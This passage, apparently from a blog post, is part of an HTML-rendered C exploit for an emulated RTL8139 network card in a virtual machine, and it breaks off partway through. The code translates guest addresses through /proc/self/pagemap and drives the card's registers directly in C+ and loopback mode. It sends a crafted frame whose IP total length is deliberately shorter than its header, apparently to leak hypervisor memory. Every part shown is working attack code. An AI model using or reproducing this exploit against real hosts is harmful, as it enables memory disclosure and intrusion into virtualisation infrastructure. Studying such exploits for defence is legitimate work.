class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面相关</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_PRESENT (1ULL &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_PFN ((1ULL &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 PMIO base address</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMIO_BASE 0xC000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + MTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 ownership flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 ownership flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">/* w0 end of ring flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">/* first segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_FS (1&lt;&lt;29)</span></span><br><span class="line"><span class="comment">/* last segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">/* large send packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">/* large send MSS mask, bits 16...25 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TC_LGSEN_MSS_MASK ((1 &lt;&lt; 12) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">/* UDP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_UDPCS (1&lt;&lt;17)</span></span><br><span class="line"><span class="comment">/* TCP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 bits 0...15 : buffer size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE (1&lt;&lt;16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)</span></span><br><span class="line"><span class="comment">/* w1 add tag flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TAGC (1&lt;&lt;17)</span></span><br><span class="line"><span class="comment">/* w1 bits 0...15 : VLAN tag (big endian) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_VLAN_TAG_MASK ((1&lt;&lt;16) - 1)</span></span><br><span class="line"><span class="comment">/* w2 low  32bit of Rx buffer ptr */</span></span><br><span class="line"><span class="comment">/* w3 high 32bit of Rx buffer ptr */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set after transmission */</span></span><br><span class="line"><span class="comment">/* FIFO underrun flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_UNF (1&lt;&lt;25)</span></span><br><span class="line"><span class="comment">/* transmit error summary flag, valid if set any of three below */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_TES (1&lt;&lt;23)</span></span><br><span class="line"><span class="comment">/* out-of-window collision flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_OWC (1&lt;&lt;22)</span></span><br><span class="line"><span class="comment">/* link failure flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_LNKF (1&lt;&lt;21)</span></span><br><span class="line"><span class="comment">/* excessive collisions flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_EXC (1&lt;&lt;20)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Symbolic offsets to registers. */</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers &#123;</span><br><span class="line">    MAC0 = <span class="number">0</span>,        <span class="comment">/* Ethernet hardware address. */</span></span><br><span class="line">    MAR0 = <span class="number">8</span>,        <span class="comment">/* Multicast filter. */</span></span><br><span class="line">    TxStatus0 = <span class="number">0x10</span>,<span class="comment">/* Transmit status (Four 32bit registers). C mode only */</span></span><br><span class="line">                     <span class="comment">/* Dump Tally Conter control register(64bit). C+ mode only */</span></span><br><span class="line">    TxAddr0 = <span class="number">0x20</span>,  <span class="comment">/* Tx descriptors (also four 32bit). */</span></span><br><span class="line">    RxBuf = <span class="number">0x30</span>,</span><br><span class="line">    ChipCmd = <span class="number">0x37</span>,</span><br><span class="line">    RxBufPtr = <span class="number">0x38</span>,</span><br><span class="line">    RxBufAddr = <span class="number">0x3A</span>,</span><br><span class="line">    IntrMask = <span class="number">0x3C</span>,</span><br><span class="line">    IntrStatus = <span class="number">0x3E</span>,</span><br><span class="line">    TxConfig = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig = <span class="number">0x44</span>,</span><br><span class="line">    Timer = <span class="number">0x48</span>,        <span class="comment">/* A general-purpose counter. */</span></span><br><span class="line">    RxMissed = <span class="number">0x4C</span>,    <span class="comment">/* 24 bits valid, write clears. */</span></span><br><span class="line">    Cfg9346 = <span class="number">0x50</span>,</span><br><span class="line">    Config0 = <span class="number">0x51</span>,</span><br><span class="line">    Config1 = <span class="number">0x52</span>,</span><br><span class="line">    FlashReg = <span class="number">0x54</span>,</span><br><span class="line">    MediaStatus = <span class="number">0x58</span>,</span><br><span class="line">    Config3 = <span class="number">0x59</span>,</span><br><span class="line">    Config4 = <span class="number">0x5A</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    HltClk = <span class="number">0x5B</span>,</span><br><span class="line">    MultiIntr = <span class="number">0x5C</span>,</span><br><span class="line">    PCIRevisionID = <span class="number">0x5E</span>,</span><br><span class="line">    TxSummary = <span class="number">0x60</span>, <span class="comment">/* TSAD register. Transmit Status of All Descriptors*/</span></span><br><span class="line">    BasicModeCtrl = <span class="number">0x62</span>,</span><br><span class="line">    BasicModeStatus = <span class="number">0x64</span>,</span><br><span class="line">    NWayAdvert = <span class="number">0x66</span>,</span><br><span class="line">    NWayLPAR = <span class="number">0x68</span>,</span><br><span class="line">    NWayExpansion = <span class="number">0x6A</span>,</span><br><span class="line">    <span class="comment">/* Undocumented registers, but required for proper operation. */</span></span><br><span class="line">    FIFOTMS = <span class="number">0x70</span>,        <span class="comment">/* FIFO Control and test. */</span></span><br><span class="line">    CSCR = <span class="number">0x74</span>,        <span class="comment">/* Chip Status and Configuration Register. */</span></span><br><span class="line">    PARA78 = <span class="number">0x78</span>,</span><br><span class="line">    PARA7c = <span class="number">0x7c</span>,        <span class="comment">/* Magic transceiver parameter register. */</span></span><br><span class="line">    Config5 = <span class="number">0xD8</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    TxPoll        = <span class="number">0xD9</span>,    <span class="comment">/* Tell chip to check Tx descriptors for work */</span></span><br><span class="line">    RxMaxSize    = <span class="number">0xDA</span>, <span class="comment">/* Max size of an Rx packet (8169 only) */</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>, <span class="comment">/* C+ Command register (C+ mode only) */</span></span><br><span class="line">    IntrMitigate    = <span class="number">0xE2</span>,    <span class="comment">/* rx/tx interrupt mitigation control */</span></span><br><span class="line">    RxRingAddrLO    = <span class="number">0xE4</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    RxRingAddrHI    = <span class="number">0xE8</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    TxThresh    = <span class="number">0xEC</span>, <span class="comment">/* Early Tx threshold */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits in TxConfig. */</span></span><br><span class="line"><span class="keyword">enum</span> tx_config_bits &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Interframe Gap Time. Only TxIFG96 doesn&#x27;t violate IEEE 802.3 */</span></span><br><span class="line">        TxIFGShift = <span class="number">24</span>,</span><br><span class="line">        TxIFG84 = (<span class="number">0</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 8.4us / 840ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG88 = (<span class="number">1</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 8.8us / 880ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG92 = (<span class="number">2</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 9.2us / 920ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG96 = (<span class="number">3</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 9.6us / 960ns (10 / 100Mbps) */</span></span><br><span class="line"></span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">/* enable loopback test mode */</span></span><br><span class="line">    TxCRC = (<span class="number">1</span> &lt;&lt; <span class="number">16</span>),    <span class="comment">/* DISABLE appending CRC to end of Tx packets */</span></span><br><span class="line">    TxClearAbt = (<span class="number">1</span> &lt;&lt; <span class="number">0</span>),    <span class="comment">/* Clear abort (WO) */</span></span><br><span class="line">    TxDMAShift = <span class="number">8</span>,        <span class="comment">/* DMA burst value (0-7) is shifted this many bits */</span></span><br><span class="line">    TxRetryShift = <span class="number">4</span>,    <span class="comment">/* TXRR value (0-15) is shifted this many bits */</span></span><br><span class="line"></span><br><span class="line">    TxVersionMask = <span class="number">0x7C800000</span>, <span class="comment">/* mask out version bits 30-26, 23 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits in RxConfig. */</span></span><br><span class="line"><span class="keyword">enum</span> rx_mode_bits &#123;</span><br><span class="line">    AcceptErr = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> ChipCmdBits &#123;</span><br><span class="line">    CmdReset = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* C+ mode */</span></span><br><span class="line"><span class="keyword">enum</span> CplusCmdBits &#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// big endian</span></span><br><span class="line"><span class="comment">// ethernet frame</span></span><br><span class="line"><span class="keyword">uint8_t</span> packet[] = &#123;</span><br><span class="line">    <span class="comment">/* 以太网帧 */</span></span><br><span class="line">    <span class="comment">// dst</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="comment">// src</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="comment">// 类型(代表IP协议)</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* IP数据报 */</span></span><br><span class="line">    <span class="comment">// 版本和首部长度</span></span><br><span class="line">    (<span class="number">0x4</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x5</span>,</span><br><span class="line">    <span class="comment">// TOS</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// 总长度</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="comment">// 标识</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 标志(3bit)和片偏移(以8为基本单位，也就是相当于把标志的3bit当做0来计算)</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x40</span>,</span><br><span class="line">    <span class="comment">// 上层协议，代表TCP</span></span><br><span class="line">    <span class="number">0x06</span>,</span><br><span class="line">    <span class="comment">// 首部校验和</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 源IP</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="comment">// 目的IP</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* TCP数据报 */</span></span><br><span class="line">    <span class="comment">// 源端口</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 目的端口</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,</span><br><span class="line">    <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// 报头长度等</span></span><br><span class="line">    <span class="number">0x50</span>,</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="number">0x10</span>,</span><br><span class="line">    <span class="comment">// Window size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xed</span>,</span><br><span class="line">    <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// Urgent pointer</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx/Tx descriptor</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;rtl8139_desc;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx/Tx ring</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> *<span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *buffer;</span><br><span class="line">&#125;rtl8139_ring;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PAGE_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PAGE_PFN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | ((<span class="keyword">uint64_t</span>)addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writeb</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writew</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outw(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writel</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readb</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inb(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readw</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inw(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readl</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring *ring, rtl8139_desc *desc, <span class="keyword">size_t</span> nb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nb; ++i) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line"></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;</span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">        <span class="comment">// printf(&quot;buffer[%d]: 0x%x\n&quot;, i, ring[i].desc-&gt;buf_lo);  // for debug</span></span><br><span class="line">    &#125;</span><br><span class="line">    pmio_writel((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RxRingAddrLO);</span><br><span class="line">    pmio_writel(<span class="number">0</span>, RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc *desc, <span class="keyword">void</span> *buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN  |</span><br><span class="line">                 CP_TX_EOR  |</span><br><span class="line">                 CP_TX_LS   |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS|</span><br><span class="line">                 CP_TX_LGSEN;</span><br><span class="line">    desc-&gt;dw0 |= RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    pmio_writel((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), TxAddr0);</span><br><span class="line">    pmio_writel(<span class="number">0</span>, TxAddr0+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_writel(TxLoopBack, TxConfig);</span><br><span class="line">    pmio_writel(AcceptMyPhys, RxConfig);</span><br><span class="line">    pmio_writew(CPlusRxEnb|CPlusTxEnb, CpCmd);</span><br><span class="line">    pmio_writeb(CmdRxEnb|CmdTxEnb, ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span> *buffer, <span class="keyword">void</span> *packet, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        pmio_writeb(<span class="number">1</span>&lt;&lt;<span class="number">6</span>, TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 